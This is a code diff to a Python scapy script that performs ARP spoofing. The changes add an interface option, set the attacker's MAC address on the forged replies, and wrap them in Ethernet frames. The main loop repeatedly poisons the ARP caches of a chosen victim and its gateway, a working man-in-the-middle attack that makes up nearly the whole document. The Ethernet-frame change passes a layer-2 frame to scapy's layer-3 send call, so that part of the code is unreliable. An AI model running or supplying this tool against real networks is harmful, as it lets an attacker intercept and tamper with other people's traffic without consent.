@@ -9,14 +9,16 @@ import argparse
 def get_ip():
     parser = argparse.ArgumentParser(
         description="ARP Spoofing Script",
-        epilog="Example usage: python3 arp_spoffing.py -t 192.168.1.10 -s 192.168.1.1"
+        epilog="Example usage: python3 arp_spoffing.py -t 192.168.1.10 -s 192.168.1.1 -i eth0"
     )
     parser.add_argument("-t", "--target", dest="victim", help="Specify Victim IP address")
     parser.add_argument("-s", "--spoof", dest="spoof", help="Specify Spoofing IP address")
+    parser.add_argument("-i", "--interface", dest="interface", help="Specify the network interface")
     options = parser.parse_args()
 
-    if not options.victim or not options.spoof:
-        parser.error("[-] Specify Victim IP and Spoofing IP addresses --help for more details")
+    if not options.victim or not options.spoof or not options.interface:
+        parser.error("[-] Specify Victim IP, Spoofing IP addresses, and the network interface. Use --help for more "
+                     "details")
 
     return options
 
@@ -29,9 +31,11 @@ def get_mac(ip_addr):
     return answered_list[0][1].hwsrc if answered_list else None
 
 
-def spoof(target_ip, target_mac, spoof_ip):
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(arp_response, verbose=False)
+def spoof(target_ip, target_mac, spoof_ip, source_mac):
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=source_mac)
+    ethernet = scapy.Ether(dst=target_mac)
+    packet = ethernet / arp_response
+    scapy.send(packet, verbose=False)
 
 
 def restore(target_ip, target_mac, gateway_ip, gateway_mac):
@@ -45,19 +49,21 @@ def main():
     ip = get_ip()
     target_ip = ip.victim
     gateway_ip = ip.spoof
+    interface = ip.interface
 
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
+    source_mac = scapy.get_if_hwaddr(interface)
 
     if not target_mac or not gateway_mac:
         sys.exit("[-] MAC address not found. Exiting...")
 
     try:
         while True:
-            spoof(target_ip, target_mac, gateway_ip)
-            spoof(gateway_ip, gateway_mac, target_ip)
+            spoof(target_ip, target_mac, gateway_ip, source_mac)
+            spoof(gateway_ip, gateway_mac, target_ip, source_mac)
 
-            print(f"\r[+] Sent two packets ", end="")
+            print(f"\r[+] Sent two packets ", end="\n")
             sys.stdout.flush()
 
             time.sleep(1)
